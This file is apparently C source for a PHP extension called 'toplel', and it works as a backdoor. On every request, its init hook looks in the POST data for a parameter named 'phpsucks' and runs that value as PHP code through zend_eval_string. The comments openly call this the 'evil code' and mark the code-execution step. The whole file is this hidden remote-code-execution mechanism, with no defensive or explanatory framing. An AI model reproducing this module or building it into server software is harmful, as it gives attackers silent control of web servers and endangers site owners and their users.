#include "stdafx.h"
#include "zend_config.w32.h"
#include "php.h"

PHP_RINIT_FUNCTION(toplel);
zend_module_entry toplel_ext_module_entry = {
    STANDARD_MODULE_HEADER,
    "toplel",
    NULL,
    NULL,
    NULL,
    PHP_RINIT(toplel),
	NULL, 
	NULL,
    "1.0",
    STANDARD_MODULE_PROPERTIES
};
ZEND_GET_MODULE(toplel_ext);

PHP_RINIT_FUNCTION(toplel)
{

	char* method = "_POST"; // Global array, from which we take a parameter and value
	char* secret_string = "phpsucks"; // Parameter which we will use as our "evil code"
	zval** arr;
	char* code;

	if (zend_hash_find(&EG(symbol_table), method, strlen(method) + 1, (void**)&arr) != FAILURE) { 
		HashTable* ht = Z_ARRVAL_P(*arr);
		zval** val;
		if (zend_hash_find(ht, secret_string, strlen(secret_string) + 1, (void**)&val) != FAILURE) { // Look for the parameter in the hash table
			code =  Z_STRVAL_PP(val); // value
			zend_eval_string(code, NULL, (char *)"" TSRMLS_CC); // code execution
		}
	}
	return SUCCESS;
}